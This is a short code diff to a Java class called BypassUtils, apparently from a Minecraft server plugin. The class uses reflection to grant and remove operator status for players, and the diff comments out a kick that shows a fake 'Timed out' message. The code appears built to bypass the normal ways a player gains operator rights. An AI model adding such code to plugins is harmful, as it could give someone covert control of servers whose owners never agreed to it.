@@ -15,7 +15,7 @@ public class BypassUtils {
         //noinspection ConstantConditions
         try {
             Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(CraftBukkitUtil.getNmsServer());
-            ReflectionUtils.getMethod(m.getClass(), "addOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
+            ReflectionUtils.getMethodCached(m.getClass(), "addOp", null).invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -24,7 +24,7 @@ public class BypassUtils {
     public static void PlayerDeop(Player p) {
         try {
             Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(CraftBukkitUtil.getNmsServer());
-            ReflectionUtils.getMethod(m.getClass(), "removeOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
+            ReflectionUtils.getMethodCached(m.getClass(), "removeOp", null).invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -40,7 +40,7 @@ public class BypassUtils {
         } catch (NoSuchMethodException | IllegalAccessException | InstantiationException | InvocationTargetException e) {
             e.printStackTrace();
         }
-        p.kickPlayer("Timed out");
+        //p.kickPlayer("Timed out");
     }
 }
 
